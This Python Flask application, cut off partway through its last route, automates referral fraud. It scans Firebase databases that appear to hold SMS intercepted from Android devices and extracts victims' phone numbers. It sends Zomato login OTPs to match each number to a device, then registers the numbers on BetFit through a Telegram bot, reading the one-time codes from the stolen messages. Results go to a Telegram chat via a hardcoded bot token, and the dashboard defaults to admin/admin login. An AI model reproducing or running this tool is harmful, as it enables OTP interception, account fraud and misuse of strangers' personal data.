import os
import sys
try:
    sys.stdout.reconfigure(encoding='utf-8')
except AttributeError:
    pass
import time
import json
import re
import uuid
import threading
import shutil
import requests
import asyncio
import queue
from datetime import datetime
from collections import deque
from flask import Flask, render_template, request, redirect, url_for, jsonify, Response
from functools import wraps

# ==========================================
# APP SETUP
# ==========================================
app = Flask(__name__)
app.secret_key = os.environ.get("FLASK_SECRET", "bf-checker-secret")

DASHBOARD_USER = os.environ.get("DASHBOARD_USER", "admin")
DASHBOARD_PASS = os.environ.get("DASHBOARD_PASS", "admin")

TG_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "6908653973:AAEYy_bhVTY1y2OVwYhM2RfCU4m10chXeV0")
TG_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "1007758627")
BETFIT_BOT_USERNAME = "BetFittbot"

DATA_DIR = os.environ.get("DATA_DIR", ".")
if DATA_DIR != ".":
    os.makedirs(DATA_DIR, exist_ok=True)
    for fn in ["links.txt", "processed.txt", "hits.json", "settings.json", "instances.json", "betfit_devices.txt", "burned_phones.txt", "tg_sessions.json"]:
        tp = os.path.join(DATA_DIR, fn)
        if (not os.path.exists(tp) or os.path.getsize(tp) == 0) and os.path.exists(fn):
            shutil.copy2(fn, tp)

PROCESSED_FILE = os.path.join(DATA_DIR, "processed.txt")
BETFIT_DEVICES_FILE = os.path.join(DATA_DIR, "betfit_devices.txt")
BURNED_PHONES_FILE = os.path.join(DATA_DIR, "burned_phones.txt")
HITS_FILE = os.path.join(DATA_DIR, "hits.json")
LINKS_FILE = os.path.join(DATA_DIR, "links.txt")
SETTINGS_FILE = os.path.join(DATA_DIR, "settings.json")
INSTANCES_FILE = os.path.join(DATA_DIR, "instances.json")
TG_SESSIONS_FILE = os.path.join(DATA_DIR, "tg_sessions.json")
SESSIONS_DIR = os.path.join(DATA_DIR, "sessions")
os.makedirs(SESSIONS_DIR, exist_ok=True)

FILE_LOCK = threading.Lock()
LOG_BUFFER = deque(maxlen=500)
ACTIVE_THREADS = {}
RUNNING_FLAGS = {}
STATS = {"total_scanned": 0, "total_hits": 0, "total_errors": 0}
STATS_LOCK = threading.Lock()
ZOMATO_LOCK = threading.Lock()
ZOMATO_LAST_CALL = 0

# Burned phones (already registered on BetFit)
_burned_phones_lock = threading.Lock()
_burned_phones = set()

def load_burned_phones():
    global _burned_phones
    if os.path.exists(BURNED_PHONES_FILE):
        with open(BURNED_PHONES_FILE, 'r') as f:
            _burned_phones = set(line.strip() for line in f if line.strip())

def is_phone_burned(phone):
    return phone in _burned_phones

def mark_phone_burned(phone):
    with _burned_phones_lock:
        if phone not in _burned_phones:
            _burned_phones.add(phone)
            with open(BURNED_PHONES_FILE, 'a') as f:
                f.write(phone + '\n')

load_burned_phones()

# Per-session setup state
AUTH_TASKS = {}

class AuthTask(threading.Thread):
    def __init__(self, session_name, api_id, api_hash, phone):
        super().__init__(daemon=True)
        self.session_name = session_name
        self.api_id = api_id
        self.api_hash = api_hash
        self.phone = phone
        self.cmd_queue = queue.Queue()
        self.state = 'init'
        self.error = ''
        self.phone_hash = ''
        self.need_2fa = False

    def run(self):
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        from telethon import TelegramClient
        from telethon.errors import SessionPasswordNeededError
        session_path = os.path.join(SESSIONS_DIR, self.session_name)
        client = TelegramClient(
            session_path, int(self.api_id), self.api_hash,
            device_model="Desktop PC", system_version="Windows 11",
            app_version="4.14.0", lang_code="en", system_lang_code="en-US"
        )
        try:
            loop.run_until_complete(client.connect())
            res = loop.run_until_complete(client.send_code_request(self.phone))
            self.phone_hash = res.phone_code_hash
            self.state = 'waiting_code'
        except Exception as e:
            self.error = str(e)
            self.state = 'error'
            loop.run_until_complete(client.disconnect())
            return

        while True:
            try:
                cmd = self.cmd_queue.get(timeout=300)
            except queue.Empty:
                self.error = "Timeout waiting for code"
                self.state = 'error'
                break
            if cmd['action'] == 'verify':
                try:
                    loop.run_until_complete(client.sign_in(self.phone, cmd['code'], phone_code_hash=self.phone_hash))
                    self.state = 'done'
                    break
                except SessionPasswordNeededError:
                    if cmd.get('password'):
                        try:
                            loop.run_until_complete(client.sign_in(password=cmd['password']))
                            self.state = 'done'
                            break
                        except Exception as e:
                            self.error = str(e)
                            self.state = 'error'
                            break
                    else:
                        self.need_2fa = True
                        self.state = 'waiting_2fa'
                except Exception as e:
                    self.error = str(e)
                    self.state = 'error'
                    break
            elif cmd['action'] == 'cancel':
                break
        loop.run_until_complete(client.disconnect())
        loop.close()

# ==========================================
# LOGGING
# ==========================================
class LogCatcher:
    def __init__(self, original):
        self.original = original
    def write(self, text):
        try:
            self.original.write(text)
        except UnicodeEncodeError:
            self.original.write(text.encode('ascii', 'replace').decode('ascii'))
        if text.strip():
            ts = datetime.now().strftime("%H:%M:%S")
            LOG_BUFFER.append(f"[{ts}] {text.strip()}")
    def flush(self):
        self.original.flush()

sys.stdout = LogCatcher(sys.stdout)

# ==========================================
# SETTINGS
# ==========================================
def get_settings():
    defaults = {"proxy": "", "betfit_bot": BETFIT_BOT_USERNAME}
    if not os.path.exists(SETTINGS_FILE):
        return defaults
    try:
        with open(SETTINGS_FILE, "r") as f:
            return {**defaults, **json.load(f)}
    except:
        return defaults

def save_settings_data(s):
    with open(SETTINGS_FILE, "w") as f:
        json.dump(s, f)

def get_proxy_dict():
    s = get_settings()
    proxy = s.get("proxy", "").strip()
    if proxy:
        return {"http": proxy, "https": proxy}
    return None

# ==========================================
# TELEGRAM SESSIONS
# ==========================================
def load_tg_sessions():
    if not os.path.exists(TG_SESSIONS_FILE):
        return []
    try:
        with open(TG_SESSIONS_FILE, "r") as f:
            return json.load(f)
    except:
        return []

def save_tg_sessions(sessions):
    with open(TG_SESSIONS_FILE, "w") as f:
        json.dump(sessions, f, indent=2)

def get_tg_session(name):
    for s in load_tg_sessions():
        if s.get("name") == name:
            return s
    return None

def session_is_authenticated(name):
    for s in load_tg_sessions():
        if s.get("name") == name:
            return s.get("is_authenticated", False)
    return False

# ==========================================
# INSTANCES
# ==========================================
def load_instances():
    if not os.path.exists(INSTANCES_FILE):
        return []
    try:
        with open(INSTANCES_FILE, "r") as f:
            data = json.load(f)
            return data if isinstance(data, list) else []
    except:
        return []

def save_instances(data):
    with open(INSTANCES_FILE, "w") as f:
        json.dump(data, f)

# ==========================================
# TELEGRAM ALERTS
# ==========================================
def send_telegram_alert(message):
    if not TG_TOKEN or not TG_CHAT_ID:
        return
    try:
        requests.post(
            f"https://api.telegram.org/bot{TG_TOKEN}/sendMessage",
            json={"chat_id": TG_CHAT_ID, "text": message, "parse_mode": "HTML", "disable_web_page_preview": True},
            timeout=10
        )
    except Exception as e:
        print(f"[!] TG Alert Failed: {e}")

# ==========================================
# FILE HELPERS
# ==========================================
def load_processed():
    with FILE_LOCK:
        try:
            with open(PROCESSED_FILE, "r") as f:
                return set(l.strip() for l in f if l.strip())
        except FileNotFoundError:
            return set()

def mark_processed(phone):
    with FILE_LOCK:
        with open(PROCESSED_FILE, "a") as f:
            f.write(f"{phone}\n")

def load_betfit_devices():
    with FILE_LOCK:
        try:
            with open(BETFIT_DEVICES_FILE, "r") as f:
                return set(l.strip() for l in f if l.strip())
        except FileNotFoundError:
            return set()

def mark_betfit_device(dev_id):
    with FILE_LOCK:
        with open(BETFIT_DEVICES_FILE, "a") as f:
            f.write(f"{dev_id}\n")

def save_hit_json(result):
    with FILE_LOCK:
        hits = []
        try:
            with open(HITS_FILE, "r") as f:
                hits = json.load(f)
        except:
            pass
        result['timestamp'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        hits.append(result)
        with open(HITS_FILE, "w") as f:
            json.dump(hits, f, indent=2)

def load_hits():
    try:
        with open(HITS_FILE, "r") as f:
            return json.load(f)
    except:
        return []

def load_links():
    if not os.path.exists(LINKS_FILE):
        return []
    links = []
    with open(LINKS_FILE, "r") as f:
        for line in f:
            line = line.strip()
            if not line:
                continue
            url = line.rstrip("/")
            if not url.startswith("http"):
                url = "https://" + url
            links.append(url)
    return links

# ==========================================
# FIREBASE HELPERS
# ==========================================
def fetch_firebase(url, proxies=None):
    for attempt in range(3):
        try:
            r = requests.get(url, timeout=12, proxies=proxies)
            if r.status_code == 200:
                return r.json()
            elif r.status_code >= 500:
                time.sleep(1)
                continue
            else:
                break
        except:
            time.sleep(1)
    return None

def fetch_clients(fb_url, proxies=None):
    return fetch_firebase(f"{fb_url}/clients.json", proxies) or {}

def extract_phone_from_device(device):
    if not isinstance(device, dict):
        return ""
    raw = device.get("mobNo", "")
    if not raw or str(raw) in ("", "-", "None"):
        sims = device.get("sims")
        if sims and isinstance(sims, dict):
            sims = list(sims.values())
        if sims and isinstance(sims, list) and len(sims) > 0 and isinstance(sims[0], dict):
            raw = sims[0].get("phoneNumber", "")
    if not raw or str(raw) in ("", "-", "None"):
        raw = device.get("phoneNumber", "")
    if not raw or str(raw) in ("", "-", "None"):
        return ""
    mobile = str(raw).replace("+91", "").replace(" ", "").replace("-", "").strip()
    if len(mobile) != 10 or not mobile.isdigit():
        return ""
    return mobile

_PHONE_PATTERNS = [
    re.compile(r'(?:Jio|JIO|Airtel|AIRTEL|Vi|VI|Vodafone|BSNL)\s+(?:Number|No\.?|Num)\s*[:\-]\s*([6-9][0-9]{9})', re.IGNORECASE),
    re.compile(r'(?:your\s+)?(?:mobile|mob\.?|phone|contact)\s+(?:no\.?|number|num)\s*[:\-]\s*(?:\+?91[-\s]?)([6-9][0-9]{9})', re.IGNORECASE),
    re.compile(r'Number\s*[:\-]\s*([6-9][0-9]{9})', re.IGNORECASE),
    re.compile(r'(\+91[-\s]?[6-9][0-9]{9})'),
    re.compile(r'(?:\b91)([6-9][0-9]{9})\b'),
    re.compile(r'(?:^|\s|:)([6-9][0-9]{9})(?:\s|$|\.)'),
]

def extract_phone_from_sms(text):
    for pattern in _PHONE_PATTERNS:
        m = pattern.search(text)
        if m and m.group(1):
            digits = re.sub(r'[^0-9]', '', m.group(1))
            if len(digits) == 10 and digits[0] in '6789':
                return digits
            if len(digits) == 12 and digits.startswith('91') and digits[2] in '6789':
                return digits[2:]
    return None

def extract_phones_from_messages(fb_url, device_id, proxies=None):
    try:
        data = fetch_firebase(f'{fb_url}/messages/{device_id}.json?orderBy="$key"&limitToLast=150', proxies)
        if not data or not isinstance(data, dict):
            return []
        phones = set()
        for msg in data.values():
            if not isinstance(msg, dict):
                continue
            text = str(msg.get("message", "") or msg.get("body", "") or msg.get("text", ""))
            if text.strip():
                phone = extract_phone_from_sms(text)
                if phone:
                    phones.add(phone)
        return list(phones)
    except:
        return []

def get_last_message_key(fb_url, device_id, proxies=None):
    try:
        data = fetch_firebase(f'{fb_url}/messages/{device_id}.json?orderBy="$key"&limitToLast=1', proxies)
        if data and isinstance(data, dict):
            keys = list(data.keys())
            if keys:
                return keys[-1]
    except:
        pass
    return ""

# ==========================================
# BETFIT SMS SCANNER
# ==========================================
def device_has_betfit_sms(fb_url, device_id, proxies=None):
    data = fetch_firebase(f'{fb_url}/messages/{device_id}.json', proxies)
    if not data or not isinstance(data, dict):
        return False
    for msg in data.values():
        if not isinstance(msg, dict):
            continue
        sender = str(msg.get('sender', '') or msg.get('from', '')).lower()
        text = str(msg.get('message', '') or msg.get('body', '') or msg.get('text', '')).lower()
        if 'betfit' in sender or 'betfit' in text:
            return True
    return False

# ==========================================
# ZOMATO OTP (Probe for number<->device)
# ==========================================
def zomato_send_otp(phone, proxies=None):
    global ZOMATO_LAST_CALL
    with ZOMATO_LOCK:
        elapsed = time.time() - ZOMATO_LAST_CALL
        if elapsed < 3:
            time.sleep(3 - elapsed)
        ZOMATO_LAST_CALL = time.time()
    try:
        csrf = uuid.uuid4().hex
        lc = uuid.uuid4().hex
        session = requests.Session()
        session.headers.update({
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36'
        })
        if proxies:
            session.proxies.update(proxies)
        payload = {
            'country_id': '1', 'number': phone, 'type': 'initiate',
            'hash': '', 'id_token': '', 'fb_token': '', 'email': '', 'name': '',
            'otp': '', 'csrf_token': csrf, 'lc': lc,
            'verification_type': 'sms', 'message_uuid': '', 'theme': ''
        }
        r = session.post(
            'https://accounts.zomato.com/login/phone',
            files={k: (None, str(v)) for k, v in payload.items()},
            headers={
                'x-zomato-csrft': '',
                'origin': 'https://accounts.zomato.com',
                'referer': f'https://accounts.zomato.com/zoauth/login?login_challenge={lc}',
            },
            timeout=12
        )
        result = r.json()
        if not result.get('status', False):
            print(f"    [!] Zomato API rejected {phone}: {result}")
        return result.get('status', False)
    except Exception as e:
        print(f'    [!] Zomato OTP error: {e}')
        return False

def poll_for_zomato_otp(fb_url, device_id, last_key, timeout, instance_id, proxies=None):
    start = time.time()
    while time.time() - start < timeout and RUNNING_FLAGS.get(instance_id, False):
        try:
            data = fetch_firebase(f'{fb_url}/messages/{device_id}.json?orderBy="$key"&limitToLast=20', proxies)
            if data and isinstance(data, dict):
                for msg_key, msg in data.items():
                    if msg_key > last_key and isinstance(msg, dict):
                        text = str(msg.get('message', '') or msg.get('body', '') or msg.get('text', ''))
                        sender = str(msg.get('sender', '') or msg.get('from', '')).lower()
                        is_zomato = any(kw in text.lower() for kw in ['zomato', 'eternal'])
                        is_zomato = is_zomato or any(kw in sender for kw in ['zomato', 'zm-', 'eternal'])
                        if is_zomato:
                            match = re.search(r'(\d{6})', text)
                            if match:
                                return match.group(1)
        except:
            pass
        time.sleep(2)
    return None

# ==========================================
# BETFIT OTP POLLER
# ==========================================
def poll_for_betfit_otp(fb_url, device_id, last_key, timeout=90, proxies=None):
    start = time.time()
    while time.time() - start < timeout:
        try:
            data = fetch_firebase(f'{fb_url}/messages/{device_id}.json?orderBy="$key"&limitToLast=20', proxies)
            if data and isinstance(data, dict):
                for msg_key, msg in data.items():
                    if msg_key > last_key and isinstance(msg, dict):
                        text = str(msg.get('message', '') or msg.get('body', '') or msg.get('text', ''))
                        sender = str(msg.get('sender', '') or msg.get('from', '')).lower()
                        if 'betfit' in sender or 'betfit' in text.lower():
                            match = re.search(r'OTP is (\d{6})', text)
                            if not match:
                                match = re.search(r'(\d{6})', text)
                            if match:
                                return match.group(1)
        except:
            pass
        time.sleep(3)
    return None

# ==========================================
# BETFIT BOT INTERACTION
# ==========================================
async def betfit_register(client, phone, fb_url, device_id, proxies, instance_id):
    """Full BetFit bot interaction. Returns result dict."""
    settings = get_settings()
    bot = settings.get("betfit_bot", BETFIT_BOT_USERNAME)

    # Step 1: Send /start
    await client.send_message(bot, '/start')
    await asyncio.sleep(3)

    # Step 2: Click "BetFit Manual Claim" button
    clicked = False
    msgs = await client.get_messages(bot, limit=5)
    for msg in msgs:
        if msg.buttons:
            for row in msg.buttons:
                for btn in row:
                    if btn.text and 'Manual Claim' in btn.text:
                        await btn.click()
                        clicked = True
                        break
                if clicked:
                    break
        if clicked:
            break
    if not clicked:
        print(f"    [BOT] Could not find Manual Claim button")
        return {'status': 'error', 'phone': phone, 'error': 'Manual Claim button not found'}
    await asyncio.sleep(2)

    # Step 3: Capture last_key BEFORE sending phone
    last_key = get_last_message_key(fb_url, device_id, proxies)

    # Step 4: Send phone number
    await client.send_message(bot, phone)
    print(f"    [BOT] Sent {phone}, waiting for OTP...")

    # Step 5: Wait for "OTP Sent" from bot — with retry on "Connection failed"
    otp_sent = False
    max_retries = 3
    for attempt in range(max_retries):
        for _ in range(30):
            if not RUNNING_FLAGS.get(instance_id, False):
                return {'status': 'stopped', 'phone': phone, 'error': 'Instance stopped'}
            await asyncio.sleep(2)
            msgs = await client.get_messages(bot, limit=5)
            for msg in msgs:
                text = msg.text or ''
                if 'OTP Sent' in text or 'Sending OTP' in text:
                    otp_sent = True
                    break
                if 'already' in text.lower() and ('registered' in text.lower() or 'claimed' in text.lower()):
                    print(f"    [BOT] Phone already registered on BetFit")
                    return {'status': 'already_registered', 'phone': phone, 'error': 'Already registered'}

                # Retry fallback: "OTP send failed" / "Connection failed" → click "Try Again"
                if ('failed' in text.lower() or 'try again' in text.lower()) and attempt < max_retries - 1:
                    print(f"    [BOT] OTP send failed (attempt {attempt+1}/{max_retries}). Clicking Try Again...")
                    # Click "Try Again" button
                    retry_clicked = False
                    if msg.buttons:
                        for row in msg.buttons:
                            for btn in row:
                                if btn.text and 'Try Again' in btn.text:
                                    await btn.click()
                                    retry_clicked = True
                                    break
                            if retry_clicked:
                                break
                    if retry_clicked:
                        await asyncio.sleep(3)
                        # Re-send the phone number
                        await client.send_message(bot, phone)
                        print(f"    [BOT] Re-sent {phone} after retry")
                        # Update last_key for fresh OTP detection
                        last_key = get_last_message_key(fb_url, device_id, proxies)
                        break  # Break inner loop to restart polling
                    else:
                        print(f"    [BOT] Could not find Try Again button")
                        return {'status': 'error', 'phone': phone, 'error': text[:100]}

                if 'invalid' in text.lower() or 'error' in text.lower():
                    if attempt >= max_retries - 1:
                        print(f"    [BOT] Bot error: {text[:80]}")
                        return {'status': 'error', 'phone': phone, 'error': text[:100]}
            if otp_sent:
                break
        if otp_sent:
            break
    if not otp_sent:
        print(f"    [BOT] Timeout waiting for OTP Sent after {max_retries} attempts")
        return {'status': 'error', 'phone': phone, 'error': 'Timeout waiting for OTP Sent'}

    print(f"    [BOT] OTP Sent! Polling Firebase for BetFit OTP...")

    # Step 6: Poll Firebase for BetFit OTP
    otp = await asyncio.to_thread(poll_for_betfit_otp, fb_url, device_id, last_key, 90, proxies)
    if not otp:
        print(f"    [BOT] BetFit OTP not received in time")
        # Try to cancel
        msgs = await client.get_messages(bot, limit=3)
        for msg in msgs:
            if msg.buttons:
                for row in msg.buttons:
                    for btn in row:
                        if btn.text and 'Cancel' in btn.text:
                            await btn.click()
        return {'status': 'otp_timeout', 'phone': phone, 'error': 'BetFit OTP not received in time'}

    # Step 7: Send OTP to bot
    print(f"    [BOT] BetFit OTP: {otp}. Sending...")
    await client.send_message(bot, otp)
    await asyncio.sleep(5)

    # Step 8: Check for success
    msgs = await client.get_messages(bot, limit=5)
    for msg in msgs:
        text = msg.text or ''
        if 'Registration Successful' in text or 'Refer counted' in text:
            print(f"    [BOT] SUCCESS! BetFit registration complete for {phone}")
            return {'status': 'success', 'phone': phone, 'device_id': device_id, 'fb_url': fb_url}
        if 'invalid' in text.lower() or 'failed' in text.lower() or 'expired' in text.lower():
            print(f"    [BOT] Registration failed: {text[:80]}")
            return {'status': 'failed', 'phone': phone, 'error': text[:100]}

    # If no clear success/fail message, check one more time
    await asyncio.sleep(3)
    msgs = await client.get_messages(bot, limit=5)
    for msg in msgs:
        text = msg.text or ''
        if 'Registration Successful' in text or 'Refer counted' in text:
            return {'status': 'success', 'phone': phone, 'device_id': device_id, 'fb_url': fb_url}

    return {'status': 'unknown', 'phone': phone, 'error': 'No clear success/fail response'}

# ==========================================
# TG HIT ALERT
# ==========================================
def send_tg_hit_alert(result):
    phone = result.get('phone', '')
    device_id = result.get('device_id', '')
    fb_url = result.get('fb_url', '')
    fb_short = fb_url.replace('https://', '').replace('.firebaseio.com', '')
    msg = (
        f"\U0001f7e2 <b>BetFit Refer Success!</b>\n\n"
        f"\U0001f4f1 <b>Phone:</b> <code>{phone}</code>\n"
        f"\u2705 <b>Status:</b> Refer counted!\n"
        f"\U0001f4df <b>Device:</b> <code>{device_id[:16]}</code>\n"
        f"\U0001f525 <b>DB:</b> {fb_short}"
    )
    send_telegram_alert(msg)

# ==========================================
# FIREBASE WORKER
# ==========================================
def firebase_worker(instance_id, start_idx, end_idx, session_name):
    proxies = get_proxy_dict()
    RUNNING_FLAGS[instance_id] = True

    session_info = get_tg_session(session_name)
    if not session_info:
        print(f"[!] Inst {instance_id}: Session '{session_name}' not found!")
        RUNNING_FLAGS[instance_id] = False
        return

    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)

    from telethon import TelegramClient
    session_path = os.path.join(SESSIONS_DIR, session_name)
    client = TelegramClient(session_path, int(session_info['api_id']), session_info['api_hash'])
    loop.run_until_complete(client.connect())

    if not loop.run_until_complete(client.is_user_authorized()):
        print(f"[!] Inst {instance_id}: Session '{session_name}' not authorized!")
        RUNNING_FLAGS[instance_id] = False
        return

    me = loop.run_until_complete(client.get_me())
    print(f"[+] Inst {instance_id} started: links {start_idx}-{end_idx} | TG: {me.first_name} (+{me.phone})")

    while RUNNING_FLAGS.get(instance_id, False):
        try:
            links = load_links()
            if not links:
                time.sleep(10)
                continue
            actual_end = min(end_idx, len(links) - 1)
            if start_idx > actual_end:
                time.sleep(10)
                continue

            for idx in range(start_idx, actual_end + 1):
                if not RUNNING_FLAGS.get(instance_id, False):
                    break
                fb_url = links[idx].strip().rstrip('/')
                fb_short = fb_url.replace("https://", "").replace(".firebaseio.com", "")
                print(f"[*] Inst {instance_id} Scanning: {fb_short}")

                clients = fetch_clients(fb_url, None)
                betfit_devices = load_betfit_devices()

                for device_id, device_info in clients.items():
                    if not RUNNING_FLAGS.get(instance_id, False):
                        break
                    if not isinstance(device_info, dict):
                        continue
                    if device_id in betfit_devices:
                        continue

                    # Check if device already has BetFit SMS
                    if device_has_betfit_sms(fb_url, device_id, None):
                        print(f"[*] Inst {instance_id} Device {device_id[:12]} already has BetFit SMS. Skipping.")
                        mark_betfit_device(device_id)
                        betfit_devices.add(device_id)
                        continue

                    phones = set()
                    primary = extract_phone_from_device(device_info)
                    if primary:
                        phones.add(primary)
                    sms_phones = extract_phones_from_messages(fb_url, device_id, None)
                    phones.update(sms_phones)
                    if not phones:
                        continue

                    processed = load_processed()
                    fresh = [p for p in phones if p not in processed]
                    if not fresh:
                        continue

                    for phone in fresh:
                        if not RUNNING_FLAGS.get(instance_id, False):
                            break
                        if phone in load_processed():
                            continue
                        if is_phone_burned(phone):
                            print(f"    [~] Skipping {phone} (already registered on BetFit)")
                            mark_processed(phone)
                            continue

                        print(f"[*] Inst {instance_id} Checking: {phone} | Device: {device_id[:12]}")

                        # Zomato OTP probe
                        last_key = get_last_message_key(fb_url, device_id, None)
                        sent = zomato_send_otp(phone, proxies)
                        if not sent:
                            print(f"    [-] Zomato OTP failed for {phone}")
                            mark_processed(phone)
                            continue

                        otp = poll_for_zomato_otp(fb_url, device_id, last_key, 12, instance_id, None)
                        if not otp:
                            print(f"    [-] No Zomato OTP on device for {phone}")
                            mark_processed(phone)
                            with STATS_LOCK:
                                STATS['total_scanned'] += 1
                            continue

                        print(f"    [+] Zomato OTP received! {phone} confirmed on device {device_id[:12]}")
                        print(f"    [+] Starting BetFit registration...")

                        # BetFit bot interaction
                        try:
                            result = loop.run_until_complete(
                                betfit_register(client, phone, fb_url, device_id, None, instance_id)
                            )
                            status = result.get('status', '')

                            if status == 'success':
                                print(f"    [HIT] {phone} -> BetFit Refer counted!")
                                with STATS_LOCK:
                                    STATS['total_hits'] += 1
                                save_hit_json(result)
                                send_tg_hit_alert(result)
                                mark_betfit_device(device_id)
                                betfit_devices.add(device_id)
                            elif status == 'already_registered':
                                print(f"    [~] {phone} already registered on BetFit. Burning.")
                                mark_phone_burned(phone)
                            elif status in ('otp_timeout', 'stopped'):
                                print(f"    [-] {status}: {result.get('error', '')}")
                            else:
                                error_msg = result.get('error', 'Unknown')
                                error_lower = error_msg.lower()

                                already_used = any(kw in error_lower for kw in [
                                    'already registered', 'already claimed', 'already referred'
                                ])
                                routine = any(kw in error_lower for kw in [
                                    'otp not received', 'timed out', 'timeout',
                                    'connection', 'manual claim button not found'
                                ])

                                if already_used:
                                    print(f"    [~] {phone} already used. Burning.")
                                    mark_phone_burned(phone)
                                elif routine:
                                    print(f"    [-] {error_msg}")
                                else:
                                    print(f"    [!] BetFit error: {error_msg}")
                                    with STATS_LOCK:
                                        STATS['total_errors'] += 1
                                    alert = (
                                        f"\u26a0\ufe0f <b>BetFit Error</b>\n"
                                        f"\U0001f4f1 Phone: <code>{phone}</code>\n"
                                        f"\u274c Error: {error_msg}\n"
                                        f"\U0001f4df Device: <code>{device_id[:16]}</code>\n"
                                        f"\U0001f517 Firebase: {fb_url}"
                                    )
                                    send_telegram_alert(alert)

                        except Exception as e:
                            print(f"    [!] Bot error for {phone}: {e}")
                            with STATS_LOCK:
                                STATS['total_errors'] += 1

                        mark_processed(phone)
                        with STATS_LOCK:
                            STATS['total_scanned'] += 1
                        time.sleep(1)
                        break  # Active number found, move to next device

            print(f"[+] Inst {instance_id} cycle complete. Restarting in 10s...")
            time.sleep(10)
        except Exception as e:
            print(f"[!] Inst {instance_id} Error: {e}")
            with STATS_LOCK:
                STATS['total_errors'] += 1
            time.sleep(10)

    loop.run_until_complete(client.disconnect())
    loop.close()
    print(f"[-] Inst {instance_id} stopped.")
    ACTIVE_THREADS.pop(instance_id, None)

# ==========================================
# FLASK AUTH
# ==========================================
def check_auth(username, password):
    return username == DASHBOARD_USER and password == DASHBOARD_PASS

def authenticate():
    return Response('Login Required', 401, {'WWW-Authenticate': 'Basic realm="Login Required"'})

def requires_auth(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        auth = request.authorization
        if not auth or not check_auth(auth.username, auth.password):
            return authenticate()
        return f(*args, **kwargs)
    return decorated

# ==========================================
# FLASK ROUTES
# ==========================================
@app.route("/")
@requires_auth
def index():
    instances = load_instances()
    settings = get_settings()
    tg_sessions = load_tg_sessions()
    for s in tg_sessions:
        s['authenticated'] = session_is_authenticated(s['name'])
    for inst in instances:
        inst_id = str(inst.get("id"))
        inst["status"] = "Running" if RUNNING_FLAGS.get(inst_id, False) else "Stopped"
    return render_template("dashboard.html",
        instances=instances, settings=settings, stats=STATS,
        tg_sessions=tg_sessions
    )

@app.route("/api/tg_sessions", methods=["POST"])
@requires_auth
def manage_tg_sessions():
    action = request.form.get("action")
    sessions = load_tg_sessions()
    if action == "add":
        name = request.form.get("name", "").strip()
        api_id = request.form.get("api_id", "").strip()
        api_hash = request.form.get("api_hash", "").strip()
        if name and api_id and api_hash:
            if not any(s['name'] == name for s in sessions):
                sessions.append({"name": name, "api_id": api_id, "api_hash": api_hash, "phone": "", "is_authenticated": False})
                save_tg_sessions(sessions)
    elif action == "delete":
        name = request.form.get("name", "").strip()
        sessions = [s for s in sessions if s['name'] != name]
        save_tg_sessions(sessions)
        sf = os.path.join(SESSIONS_DIR, f"{name}.session")
        if os.path.exists(sf):
            os.remove(sf)
    return redirect(url_for("index"))

@app.route("/api/tg_send_code", methods=["POST"])
@requires_auth
def tg_send_code():
    session_name = request.form.get("session_name", "").strip()
    phone = request.form.get("phone", "").strip()
    session_info = get_tg_session(session_name)
    if not session_info:
        return jsonify({"status": "error", "message": "Session not found"})
    if not phone:
        return jsonify({"status": "error", "message": "Phone required"})
    if session_name in AUTH_TASKS:
        AUTH_TASKS[session_name].cmd_queue.put({'action': 'cancel'})
        time.sleep(1)
    task = AuthTask(session_name, session_info['api_id'], session_info['api_hash'], phone)
    AUTH_TASKS[session_name] = task
    task.start()
    for _ in range(30):
        if task.state == 'waiting_code':
            sessions = load_tg_sessions()
            for s in sessions:
                if s['name'] == session_name:
                    s['phone'] = phone
            save_tg_sessions(sessions)
            return jsonify({"status": "code_sent"})
        if task.state == 'error':
            return jsonify({"status": "error", "message": task.error})
        time.sleep(0.5)
    return jsonify({"status": "error", "message": "Timeout"})

@app.route("/api/tg_verify", methods=["POST"])
@requires_auth
def tg_verify():
    session_name = request.form.get("session_name", "").strip()
    code = request.form.get("code", "").strip()
    password = request.form.get("password", "").strip()
    task = AUTH_TASKS.get(session_name)
    if not task or task.state not in ['waiting_code', 'waiting_2fa']:
        return jsonify({"status": "error", "message": "No active auth session"})
    task.cmd_queue.put({'action': 'verify', 'code': code, 'password': password})
    for _ in range(30):
        if task.state == 'done':
            sessions = load_tg_sessions()
            for s in sessions:
                if s['name'] == session_name:
                    s['is_authenticated'] = True
            save_tg_sessions(sessions)
            return jsonify({"status": "success"})
        if task.state == 'waiting_2fa':
            return jsonify({"status": "need_2fa"})
        if task.state == 'error':
            return jsonify({"status": "error", "message": task.error})
        time.sleep(0.5)
    return jsonify({"status": "error", "message": "Timeout"})

@app.route("/api/instances", methods=["POST"])
@requires_auth
def manage_instances():
    action = request.form.get("action")
    instances = load_instances()

    if action == "add":
        new_id = str(max([int(i.get('id', 0)) for i in instances], default=0) + 1)
        start_idx = request.form.get("start_idx", 0, type=int)
        end_idx = request.form.get("end_idx", 0, type=int)
        session = request.form.get("session", "").strip()
        instances.append({"id": new_id, "start_idx": start_idx, "end_idx": end_idx, "session": session})
        save_instances(instances)

    elif action == "start":
        inst_id = request.form.get("id")
        for inst in instances:
            if str(inst.get("id")) == str(inst_id):
                if not RUNNING_FLAGS.get(inst_id, False):
                    sess = inst.get("session", "")
                    t = threading.Thread(target=firebase_worker, args=(inst_id, inst["start_idx"], inst["end_idx"], sess))
                    t.daemon = True
                    ACTIVE_THREADS[inst_id] = t
                    t.start()
                break

    elif action == "stop":
        inst_id = request.form.get("id")
        RUNNING_FLAGS[inst_id] = False

    elif action == "delete":
        inst_id = request.form.get("id")
        RUNNING_FLAGS[inst_id] = False
        instances = [i for i in instances if str(i.get("id")) != str(inst_id)]
        save_instances(instances)

    elif action == "auto_divide":
        for k in list(RUNNING_FLAGS.keys()):
            RUNNING_FLAGS[k] = False
        time.sleep(1)
        count = len(load_links())
        n = request.form.get("num_instances", 1, type=int)
        session = request.form.get("session", "").strip()
        if n > 0 and count > 0:
            new_instances = []
            chunk = count // n
            rem = count % n
            curr = 0
            for i in range(n):
                extra = 1 if i < rem else 0
                end = curr + chunk + extra - 1
                new_instances.append({"id": str(i + 1), "start_idx": curr, "end_idx": end, "session": session})
                curr = end + 1
            instances = new_instances
            save_instances(instances)

    return redirect(url_for("index"))

@app.route("/api/toggle", methods=["POST"])
@requires_auth
def toggle_instances():
    action = request.form.get("action")
